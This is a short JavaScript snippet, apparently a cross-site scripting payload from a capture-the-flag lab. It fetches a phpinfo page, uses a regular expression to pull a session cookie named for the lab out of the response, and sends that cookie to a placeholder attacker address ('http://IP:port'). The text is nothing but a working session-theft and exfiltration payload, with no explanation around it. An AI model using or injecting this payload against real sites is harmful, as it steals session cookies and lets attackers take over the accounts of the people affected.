fetch('/phpinfo.php') .then(response => response.text()) .then(text => { cookie = text.match(/dropctf_lab_session.{1,2000}/)[0]; fetch('http://IP:port/?cookie=' + encodeURIComponent(cookie)); });
